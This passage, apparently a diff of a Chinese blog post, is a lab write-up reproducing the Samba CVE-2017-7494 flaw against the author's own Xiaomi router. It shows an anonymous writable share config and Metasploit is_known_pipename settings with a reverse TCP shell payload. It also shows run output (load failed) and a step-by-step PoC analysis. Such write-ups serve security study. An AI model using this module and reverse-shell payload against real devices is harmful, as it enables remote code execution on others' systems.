microsoft-ds</span><br></pre></td></tr></table></figure>
+<p><strong><em>端口已开启</em></strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/samba/smb.conf</span><br><span class="line">        deadtime = 30</span><br><span class="line">        domain master = yes</span><br><span class="line">        encrypt passwords = true</span><br><span class="line">        enable core files = no</span><br><span class="line">        guest account = nobody</span><br><span class="line">        guest ok = yes</span><br><span class="line">        invalid users =</span><br><span class="line">        local master = yes</span><br><span class="line">        load printers = no</span><br><span class="line">        map to guest = Bad User</span><br><span class="line">        min receivefile size = 16384</span><br><span class="line">        null passwords = yes</span><br><span class="line">        obey pam restrictions = yes</span><br><span class="line">        passdb backend = smbpasswd</span><br><span class="line">        preferred master = yes</span><br><span class="line">        printable = no</span><br><span class="line">        smb encrypt = disabled</span><br><span class="line">        smb passwd file = /etc/samba/smbpasswd</span><br><span class="line">        socket options =  SO_SNDBUFFORCE=1048576 SO_RCVBUFFORCE=1048576</span><br><span class="line">        smb2 max trans = 1048576</span><br><span class="line">        smb2 max write = 1048576</span><br><span class="line">        smb2 max read = 1048576</span><br><span class="line">        write cache size = 262144</span><br><span class="line">        syslog = 2</span><br><span class="line">        syslog only = yes</span><br><span class="line">        use sendfile = yes</span><br><span class="line">        writeable = yes</span><br><span class="line">        log level = 1</span><br><span class="line">        unicode = True</span><br><span class="line">        max log size = 500</span><br><span class="line">        log file = /tmp/log/samba.log</span><br><span class="line">        server role = STANDALONE</span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">        comment     = Home Directories</span><br><span class="line">        browsable   = no</span><br><span class="line">        read only   = no</span><br><span class="line">        create mode = 0750</span><br><span class="line"></span><br><span class="line">[data]                    ***SMB_SHARE_NAME***</span><br><span class="line">        path = /tmp       ***SMB_FOLDER***</span><br><span class="line">        read only = no    ***具备可写权限***</span><br><span class="line">        guest ok = yes    ***允许匿名***</span><br><span class="line">        create mask = 0777</span><br><span class="line">        directory mask = 0777</span><br></pre></td></tr></table></figure></p>
+<p><strong><em>具有可写权限、目录为/tmp</em></strong></p>
+<h2 id="攻击：使用metasploit"><a href="#攻击：使用metasploit" class="headerlink" title="攻击：使用metasploit"></a>攻击：使用metasploit</h2><h3 id="设置攻击参数"><a href="#设置攻击参数" class="headerlink" title="设置攻击参数"></a>设置攻击参数</h3><p>靶机是小米路由器R3，它的系统为mips架构，但是这个库好像对它的支持不是很好<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/samba/is_known_pipename):</span><br><span class="line"></span><br><span class="line">   Name            Current Setting  Required  Description</span><br><span class="line">   ----            ---------------  --------  -----------</span><br><span class="line">   RHOSTS          192.168.31.1     yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT           445              yes       The SMB service port (TCP)</span><br><span class="line">   SMB_FOLDER                       no        The directory to use within the writeable SMB share</span><br><span class="line">   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (generic/shell_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.216.129  yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   7   Linux MIPSLE</span><br></pre></td></tr></table></figure></p>
+<h3 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.216.129:4444</span><br><span class="line">[*] 192.168.31.1:445 - Using location \\192.168.31.1\data\ for the path</span><br><span class="line">[*] 192.168.31.1:445 - Retrieving the remote path of the share &apos;data&apos;</span><br><span class="line">[*] 192.168.31.1:445 - Share &apos;data&apos; has server-side path &apos;/tmp</span><br><span class="line">[*] 192.168.31.1:445 - Uploaded payload to \\192.168.31.1\data\KcQiOcbk.so</span><br><span class="line">[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using \\PIPE\/tmp/KcQiOcbk.so...</span><br><span class="line">[-] 192.168.31.1:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] 192.168.31.1:445 - Loading the payload from server-side path /tmp/KcQiOcbk.so using /tmp/KcQiOcbk.so...</span><br><span class="line">[-] 192.168.31.1:445 -   &gt;&gt; Failed to load STATUS_OBJECT_NAME_NOT_FOUND</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure>
+<p>虽然报错，但是查看共享文件夹/tmp却发现了生成了.so文件<br>知乎这篇<a href="https://zhuanlan.zhihu.com/p/27129229" target="_blank" rel="noopener">专栏</a>也有相同问题</p>
+<h2 id="分析POC，查找原因"><a href="#分析POC，查找原因" class="headerlink" title="分析POC，查找原因"></a>分析POC，查找原因</h2><p>(来自<a href="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/" target="_blank" rel="noopener">Wz’blog</a>)</p>
+<h3 id="建立SMB连接。若需要账号密码登录，则必须登录后才能继续"><a href="#建立SMB连接。若需要账号密码登录，则必须登录后才能继续" class="headerlink" title="建立SMB连接。若需要账号密码登录，则必须登录后才能继续"></a>建立SMB连接。若需要账号密码登录，则必须登录后才能继续</h3><p>从微软上扒的SMB协议建立时序图：<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-09-40.png" alt></p>
+<p>对应POC:</p>
+<p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/23-15-57.png" alt></p>
+<h3 id="利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path"><a href="#利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path" class="headerlink" title="利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)"></a>利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-38-48.jpg" alt></p>
+<p>其中find_writeable_path()函数需要跟进看一下：<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-14-43.jpg" alt></p>
+<p>再跟进看enumerate_directories()以及verify_writeable_directory函数<br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/00-48-27.jpg" alt><br><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-18-44.jpg" alt></p>
+<p>可以看到代码逻辑很清楚，首先遍历出当前路径所有的文件夹，然后尝试往里面写一个随机的txt文件用作可写测试，随后删除掉txt文件，记录下可写的文件路径。<br>至此，我们得到了一个共享名(即本例中的data)以及其当前路径下的可写目录(/tmp)</p>
+<h3 id="利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath"><a href="#利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath" class="headerlink" title="利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)"></a>利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-26-47.jpg" alt><br>至此获取到了共享名data的绝对路径。<br>值得注意的是，这里跟早期的Payload不一样，早期的payload是靠暴力猜解目录，所以跟一些分析文章有些出入。现在的Payload是根据NetShareGetInfo直接获取到准确的路径，极大地提高了攻击的成功率。</p>
+<h3 id="上传恶意so文件"><a href="#上传恶意so文件" class="headerlink" title="上传恶意so文件"></a>上传恶意so文件</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-38-28.jpg" alt><br>其中写入的so文件是Metasploit生成的反弹shell，很简单的执行一句命令。有一点需要注意的是里面的函数名必须是samba_init_module并且是一个导出函数，这个原因上述的漏洞分析也有提及。</p>
+<h3 id="调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"><a href="#调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功" class="headerlink" title="调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"></a>调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-43-02.jpg" alt><br>利用从第2步获取到的可写文件目录(Path)以及从第3步得到的共享文件绝对路径(SharePath)构造恶意管道名\PIPE\/SharePath/Path/Evil.so，然后通过SMB_COM_NT_CREATE_ANDX进行调用。<br>在复现时，调用恶意so文件总会失败，产生Error Code为：STATUS_OBJECT_NAME_NOT_FOUND的错误。尚未能明白为什么会出现这种首次失败的情况，也许要详细看看smb协议才能知道了。<br>POC代码将STATUS_OBJECT_PATH_INVALID作为我们payload被加载的标志，随后就是用NBSS协议进行了一次远程代码执行的测试，执行代码为echo随机字符串。</p>
+<h3 id="删除恶意so文件，断开smb连接"><a href="#删除恶意so文件，断开smb连接" class="headerlink" title="删除恶意so文件，断开smb连接"></a>删除恶意so文件，断开smb连接</h3><p><img src="https://www.wzsite.cn/2018/07/20/Samba%E8%BF%9C%E7%A8%8B%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90%20CVE-2017-7494/01-45-01.png" alt></p>
+<p>由msf给出的poc过程可见，对小米路由器的攻击在第五步出现问题，因此出现Failed to load STATUS_OBJECT_NAME_NOT_FOUND</p>
 
       
     </div>
@@ -637,9 +526,11 @@ Server   -------wire----------|
       
         <div class="post-tags">
           
-            <a href="/tags/侧信道攻击/" rel="tag"># 侧信道攻击</a>
+            <a href="/tags/Samba/" rel="tag"># Samba</a>
           
-            <a href="/tags/wifi/" rel="tag"># wifi</a>
+            <a href="/tags/远程执行/" rel="tag"># 远程执行</a>
+          
+            <a href="/tags/CVE/" rel="tag"># CVE</a>
           
         </div>
       
@@ -652,8 +543,8 @@ Server   -------wire----------|
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/25/TCPDUMP拒绝服务攻击漏洞/" rel="next" title="TCPDUMP拒绝服务攻击漏洞">
-                <i class="fa fa-chevron-left"></i> TCPDUMP拒绝服务攻击漏洞
+              <a href="/2019/03/23/auto-send-WX/" rel="next" title="利用itchat定时转发微信消息">
+                <i class="fa fa-chevron-left"></i> 利用itchat定时转发微信消息
               </a>
             
           </div>
@@ -661,10 +552,6 @@ Server   -------wire----------|
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/02/22/qq数据库的加密解密/" rel="prev" title="QQ数据库的加密与解密">
-                QQ数据库的加密与解密 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -833,7 +720,7 @@ Server   -------wire----------|
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#TCP侧信道分析及利用的学习报告"><span class="nav-number">1.</span> <span class="nav-text">TCP侧信道分析及利用的学习报告</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景知识"><span class="nav-number">1.1.</span> <span class="nav-text">背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测信道"><span class="nav-number">1.1.1.</span> <span class="nav-text">测信道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#网络攻击"><span class="nav-number">1.1.2.</span> <span class="nav-text">网络攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TCP三次握手"><span class="nav-number">1.1.3.</span> <span class="nav-text">TCP三次握手</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Malware-assisted"><span class="nav-number">1.2.</span> <span class="nav-text">Malware-assisted</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#变种一：防火墙"><span class="nav-number">1.2.1.</span> <span class="nav-text">变种一：防火墙</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#变种二：无防火墙"><span class="nav-number">1.2.2.</span> <span class="nav-text">变种二：无防火墙</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pure-off-path-无恶意软件协助"><span class="nav-number">1.3.</span> <span class="nav-text">Pure off-path:无恶意软件协助</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Global-Rate-Limit"><span class="nav-number">1.3.1.</span> <span class="nav-text">Global Rate Limit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Unfixable-WiFi-timing"><span class="nav-number">1.3.2.</span> <span class="nav-text">Unfixable WiFi timing</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Discussion"><span class="nav-number">1.4.</span> <span class="nav-text">Discussion</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#小米路由器与Samba漏洞CVE-2017-7494"><span class="nav-number">1.</span> <span class="nav-text">小米路由器与Samba漏洞CVE-2017-7494</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞描述"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Samba介绍"><span class="nav-number">1.2.</span> <span class="nav-text">Samba介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞成因"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞成因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞复现"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小米路由器"><span class="nav-number">1.4.1.</span> <span class="nav-text">小米路由器</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击：使用metasploit"><span class="nav-number">1.5.</span> <span class="nav-text">攻击：使用metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#设置攻击参数"><span class="nav-number">1.5.1.</span> <span class="nav-text">设置攻击参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#执行攻击"><span class="nav-number">1.5.2.</span> <span class="nav-text">执行攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析POC，查找原因"><span class="nav-number">1.6.</span> <span class="nav-text">分析POC，查找原因</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#建立SMB连接。若需要账号密码登录，则必须登录后才能继续"><span class="nav-number">1.6.1.</span> <span class="nav-text">建立SMB连接。若需要账号密码登录，则必须登录后才能继续</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用NetShareEnumAll遍历目标服务器的共享名-ShareName-以及获取对应的共享文件夹下的可写路径-Path"><span class="nav-number">1.6.2.</span> <span class="nav-text">利用NetShareEnumAll遍历目标服务器的共享名(ShareName)以及获取对应的共享文件夹下的可写路径(Path)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用NetShareGetInfo获取共享文件夹的绝对路径-SharePath"><span class="nav-number">1.6.3.</span> <span class="nav-text">利用NetShareGetInfo获取共享文件夹的绝对路径(SharePath)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传恶意so文件"><span class="nav-number">1.6.4.</span> <span class="nav-text">上传恶意so文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功"><span class="nav-number">1.6.5.</span> <span class="nav-text">调用恶意文件，并执行echo命令打印随机字符串检验是否调用成功</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#删除恶意so文件，断开smb连接"><span class="nav-number">1.6.6.</span> <span class="nav-text">删除恶意so文件，断开smb连接</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
